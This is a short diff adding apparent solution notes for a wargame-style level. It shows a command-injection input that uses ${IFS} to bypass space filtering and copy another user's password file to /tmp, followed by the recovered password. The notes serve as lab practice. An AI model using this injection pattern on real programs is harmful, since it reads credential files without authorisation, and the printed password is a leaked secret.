@@ -1,0 +1,8 @@
+mkdir /tmp/ghgh
+chmod 777 /tmp/ghgh/password
+
+in program: $(dd${IFS}if=/home/level4/password${IFS}of=/tmp/ghgh/password)
+
+cat /tmp/ghgh/password
+
+Password: BashingSh
